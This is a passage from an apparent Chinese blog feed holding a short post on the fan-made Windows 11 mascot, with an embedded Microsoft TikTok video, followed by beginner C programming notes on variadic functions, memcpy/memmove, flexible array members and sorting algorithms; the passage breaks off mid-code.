            "content_html": "<p>一个不太冷的冷知识：</p>\n<p>前几个 win 的形象都是小日子那边的官方搞的。但是 win11 这个最早是我们国家的画师（作者在 b 站有号，最早发布在 pixiv）搞出来的，不知道为什么广为流传，甚至有国外画师的二创。</p>\n<p>这还不是最离谱的，甚至微软官方都把其他画师的相关图拿出来了。</p>\n<p>这也能转正，我是没想到的。</p>\n<p>下面是微软官方的视频</p>\n<p>&lt;blockquote class=&quot;tiktok-embed&quot; cite=&quot;<a href=\"https://www.tiktok.com/@windows/video/7423542240930221343\">https://www.tiktok.com/@windows/video/7423542240930221343</a>&quot; data-video-id=&quot;7423542240930221343&quot; data-embed-from=&quot;embed_page&quot; style=&quot;max-width:605px; min-width:325px;&quot;&gt; &lt;section&gt; &lt;a target=&quot;_blank&quot; title=&quot;@windows&quot; href=&quot;<a href=\"https://www.tiktok.com/@windows?refer=embed\">https://www.tiktok.com/@windows?refer=embed</a>&quot;&gt;@windows&lt;/a&gt; &lt;p&gt;The interesting story of OS-tans… &lt;a title=&quot;windows&quot; target=&quot;_blank&quot; href=&quot;<a href=\"https://www.tiktok.com/tag/windows?refer=embed\">https://www.tiktok.com/tag/windows?refer=embed</a>&quot;&gt;#Windows&lt;/a&gt; &lt;a title=&quot;windows11&quot; target=&quot;_blank&quot; href=&quot;<a href=\"https://www.tiktok.com/tag/windows11?refer=embed\">https://www.tiktok.com/tag/windows11?refer=embed</a>&quot;&gt;#Windows11&lt;/a&gt; &lt;a title=&quot;ostans&quot; target=&quot;_blank&quot; href=&quot;<a href=\"https://www.tiktok.com/tag/ostans?refer=embed\">https://www.tiktok.com/tag/ostans?refer=embed</a>&quot;&gt;#OStans&lt;/a&gt; &lt;/p&gt; &lt;a target=&quot;_blank&quot; title=&quot;♬ original sound - Windows&quot; href=&quot;<a href=\"https://www.tiktok.com/music/original-sound-7423542252809177887?refer=embed\">https://www.tiktok.com/music/original-sound-7423542252809177887?refer=embed</a>&quot;&gt;♬ original sound - Windows&lt;/a&gt; &lt;/section&gt; &lt;/blockquote&gt; &lt;script async src=&quot;<a href=\"https://www.tiktok.com/embed.js\">https://www.tiktok.com/embed.js</a>&quot;&gt;&lt;/script&gt;<br />\n 以防不能正常显示，贴个链接：</p>\n<p><a href=\"https://www.tiktok.com/@windows/video/7423542240930221343?lang=zh-Hans\">The interesting story of OS-tans… #Windows #Windows11 #OStans | windows 10 tan | TikTok</a></p>\n",
            "tags": [
                "离谱"
            ]
        },
        {
            "id": "https://zhewanyiershinicheng.github.io/2024/10/14/C%E7%AC%94%E8%AE%B02SE/",
            "url": "https://zhewanyiershinicheng.github.io/2024/10/14/C%E7%AC%94%E8%AE%B02SE/",
            "title": "C笔记2SE",
            "date_published": "2024-10-14T05:21:05.000Z",
            "content_html": "<h2 id=\"一些函数\"><a class=\"anchor\" href=\"#一些函数\">#</a> 一些函数：</h2>\n<h3 id=\"stdargh\"><a class=\"anchor\" href=\"#stdargh\">#</a> &lt;stdarg.h &gt;</h3>\n<h4 id=\"1可变参数\"><a class=\"anchor\" href=\"#1可变参数\">#</a> 1. 可变参数</h4>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">func_name</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 声明方式，num 代表输入的个数，当然也可以加一些其他的要传的变量在前面</span></pre></td></tr></table></figure><p>在函数定义中创建一个 <strong>va_list</strong> 类型变量，该类型是在 stdarg.h 头文件中定义的。</p>\n<pre><code>va_list valist;\n</code></pre>\n<p>使用 <strong>int</strong> 类型的参数（一般就是上面的 arg1）和 <strong>va_start()</strong> 宏来初始化 <strong>va_list</strong> 变量为一个参数列表。宏 <strong>va_start()</strong> 是在 stdarg.h 头文件中定义的。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 为 num 个参数初始化 valist</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">va_start</span><span class=\"token punctuation\">(</span>valist<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>使用 <strong>va_arg()</strong> 宏和 <strong>va_list</strong> 变量来访问参数列表中的每个项。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> num<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>       sum <span class=\"token operator\">+=</span> <span class=\"token function\">va_arg</span><span class=\"token punctuation\">(</span>valist<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 假设后续输入的都是 int 类型</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用宏 <strong>va_end()</strong> 来清理赋予 <strong>va_list</strong> 变量的内存。</p>\n<pre><code>var_end(valist);\n</code></pre>\n<blockquote>\n<p>输出平均值：</p>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;stdarg.h&gt;</p>\n<p>double average(int num,...)<br />\n{</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>va_list valist<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">double</span> sum <span class=\"token operator\">=</span> <span class=\"token number\">0.0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">/* 为 num 个参数初始化 valist */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">va_start</span><span class=\"token punctuation\">(</span>valist<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">/* 访问所有赋给 valist 的参数 */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> num<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   sum <span class=\"token operator\">+=</span> <span class=\"token function\">va_arg</span><span class=\"token punctuation\">(</span>valist<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">/* 清理为 valist 保留的内存 */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token function\">va_end</span><span class=\"token punctuation\">(</span>valist<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">return</span> sum<span class=\"token operator\">/</span>num<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>}</p>\n<p>int main()<br />\n{<br />\nprintf(&quot;Average of 2, 3, 4, 5 = %f\\n&quot;, average(4, 2,3,4,5));<br />\nprintf(&quot;Average of 5, 10, 15 = %f\\n&quot;, average(3, 5,10,15));<br />\n}</p>\n</blockquote>\n<h3 id=\"stringh\"><a class=\"anchor\" href=\"#stringh\">#</a> &lt;string.h&gt;</h3>\n<h4 id=\"1memcpymemmove\"><a class=\"anchor\" href=\"#1memcpymemmove\">#</a> 1.memcpy()/memmove()</h4>\n<ul>\n<li>\n<p>memcpy () 函数：用于从源内存区域复制数据到目标内存区域。它接受三个参数，即目标内存区域的指针、源内存区域的指针和要复制的数据大小（以字节为单位）。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>dest<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>src<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//n 是字节数，dest 是要复制到的地方的首地址，src 则是要复制的数据的首地址</span></pre></td></tr></table></figure><blockquote>\n<p>复制字符数组数据：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span> </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span> </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">char</span> source<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello, World!\"</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">char</span> target<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>     </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>source<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 复制 '\\0'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 其他类型用 sizeof 即可</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></blockquote>\n</li>\n<li>\n<p>memmove () 函数：类似于 memcpy () 函数，但它可以处理重叠的内存区域（对于 memcpy (), 此时行为是未定义的）。它接受三个参数，即目标内存区域的指针、源内存区域的指针和要复制的数据大小（以字节为单位）。</p>\n<p>用法同上。如果重叠，就将 src 的对应个数的数据直接复制过去（覆盖导致的变化不会影响后续的复制）</p>\n</li>\n</ul>\n<blockquote>\n<p>比如</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">char</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefghij\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">memmove</span><span class=\"token punctuation\">(</span>arr <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> arr <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 输出是 acdefgghij</span></pre></td></tr></table></figure></blockquote>\n<p>2.memset</p>\n<h2 id=\"一些额外的东西\"><a class=\"anchor\" href=\"#一些额外的东西\">#</a> 一些额外的东西：</h2>\n<h3 id=\"1柔性数组c99以上\"><a class=\"anchor\" href=\"#1柔性数组c99以上\">#</a> 1. 柔性数组（C99 以上）</h3>\n<p>可以使用它来实现动态可变长的结构体。</p>\n<p>定义：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">FlexibleStruct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> count<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> data<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 相当于 int data [0];</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span> FlexibleStruct0<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>注意：</p>\n<p>一个结构体中只能有一个可变长的成员，并且该成员必须是最后一个成员。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FlexibleStruct <span class=\"token operator\">*</span><span class=\"token function\">createFlexibleStruct</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> numElements<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 计算总共需要分配的内存大小，包括结构体本身和柔性数组部分</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// 柔性数组本身不算在 sizeof 中（这个 data [] 它不占内存）</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">size_t</span> totalSize <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>FlexibleStruct<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> numElements <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 分配内存</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    FlexibleStruct <span class=\"token operator\">*</span>fs <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>FlexibleStruct <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>totalSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    fs<span class=\"token operator\">-></span>count <span class=\"token operator\">=</span> numElements<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> fs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>要一次性分配内存</p>\n<p>排序算法：</p>\n<p>1. 插入排序</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 函数声明</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">insertion_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 计算数组长度</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">insertion_sort</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 调用插入排序函数</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 打印排序后的数组</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 插入排序函数</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">insertion_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">int</span> temp <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 当前待插入的元素</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\">// 向右移动大于 temp 的元素</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> arr<span class=\"token punctuation\">[</span>j <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> temp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            arr<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> arr<span class=\"token punctuation\">[</span>j <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            j<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        arr<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> temp<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 插入元素到正确位置</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>2. 希尔排序</p>\n<p>它不是选择而是插入的改进</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 函数声明</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">shell_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 计算数组长度</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">shell_sort</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 调用希尔排序函数</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 打印排序后的数组</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> len<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d \"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 希尔排序函数</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">shell_sort</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> arr<span 